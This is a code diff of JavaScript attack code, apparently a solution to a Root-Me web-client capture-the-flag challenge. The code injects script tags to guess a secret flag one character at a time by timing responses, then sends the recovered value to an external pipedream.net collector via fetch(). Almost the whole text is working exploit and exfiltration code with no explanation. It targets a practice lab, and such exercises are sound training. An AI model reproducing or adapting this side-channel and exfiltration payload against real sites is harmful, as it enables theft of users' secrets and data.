@@ -26,14 +26,14 @@
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
         let cnt = 0
         let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
-        let flag = "z"
+        this.flag = "z"
         function test() {
             for (let i = 0; i < 50; i++) {
 
 
                 // declaration du script
                 let s = document.createElement('script')
-                s.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${4396}/${flag}${alpha[i]}`
+                s.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${4396}/${this.flag}${alpha[i]}`
                 document.body.appendChild(s)
 
                 var start = performance.now()
@@ -43,9 +43,9 @@
                     console.log("The request took %d ms.", time);
                     if (time >= 2000) {
                         //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
-                        flag = flag + alpha[i];
+                        this.flag += alpha[i];
                         if (cnt > 5)
-                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
+                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${this.flag}`)
                     }
 
                 }
